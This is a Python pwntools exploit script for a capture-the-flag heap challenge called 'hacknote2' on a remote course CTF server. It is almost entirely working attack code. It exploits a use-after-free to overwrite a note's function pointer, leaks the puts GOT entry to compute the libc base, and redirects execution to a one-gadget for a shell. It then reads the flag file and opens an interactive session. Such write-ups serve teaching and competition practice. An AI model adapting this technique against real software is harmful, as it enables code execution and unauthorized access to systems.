from pwn import *
LOCAL = False
binary = './hacknote2'

def pause():
    if LOCAL:
        raw_input('pause')
    else:
        sleep(0.2)

r = None
if LOCAL:
    r = process(binary)
else:
    r = remote('csie.ctf.tw', 10139)

context.arch = 'amd64'
elf = ELF(binary, checksec=False)
libc= ELF('libc.so.6', checksec=False)

def add(size, content):
    r.recvuntil('Your choice :')
    r.sendline('1')
    r.recvuntil('Note size :')
    r.sendline(str(size))
    r.recvuntil('Content :')
    r.sendline(content)

def delete(index):
    r.recvuntil('Your choice :')
    r.sendline('2')
    r.recvuntil('Index :')
    r.sendline(str(index))

def print_note(index):
    r.recvuntil('Your choice :')
    r.sendline('3')
    r.recvuntil('Index :')
    r.sendline(str(index))

def print_note_recv(index):
    print_note(index)
    mark = '----------------------'
    return r.recvuntil('----------------------')[:-(len(mark)+1)]

def quit():
    r.recvuntil('Your choice :')
    r.sendline('4')

pause()
add(32, 'asdf')
add(32, 'asdf')
delete(1)
delete(0)
add(16, p64(elf.symbols['print_note_content'])+p64(elf.got['puts']))
leak = print_note_recv(1)
puts_got_leak = int(leak[::-1].encode('hex'), 16)
libc_base = puts_got_leak - libc.symbols['puts']
print "libc_base:", hex(libc_base)

delete(2)
onegadget = libc_base + 0xf0274
add(16, p64(onegadget))
print_note(1)
#quit()

r.sendline('cat /home/`whoami`/flag')
r.interactive()
